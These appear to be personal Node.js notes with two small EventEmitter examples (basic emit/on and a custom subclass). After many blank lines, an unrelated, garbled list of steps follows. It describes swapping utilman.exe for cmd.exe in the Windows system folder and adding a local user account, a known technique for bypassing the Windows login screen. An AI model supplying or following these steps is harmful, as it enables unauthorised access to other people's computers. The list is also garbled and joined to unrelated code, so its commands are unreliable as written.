> event emiiter is just like trigger and action just like js when onClick event just like that

```node
const emitter = require('events');

const { EventEmitter } = require('stream');

  

const myemit = new EventEmitter(); //delcare the event emmiter

  

//REGISTER THE EMITTER

myemit.on("greeet",(name)=>{

    console.log(`my name is ${name}`)

})

//Calll the emitter

myemit.emit('greeet',"Raj");
```

## Cutom eventEmitter code

```node
const EventEmitter = require('events');

  

class MycustomEmiter extends EventEmitter{

    constructor(){ //Creating a constructor

        super();

        this.greeting = 'Hello';

    }

    greet(name){

        this.emit('greeting',`${this.greeting}, ${name}`);

    }

}
  

const thisWIllEmit = new MycustomEmiter();

  

thisWIllEmit.on('greeting',(input)=>{

    console.log('greeting event',input)

});

thisWIllEmit.greet("Bro");
```

















1. Navigate to windows 32
2. ren cmd to utilman2.exe
3. ren utilman.exe cmd.exe
4. utilman2 utilman
5. net user <>username> passwd /add
6. netplivz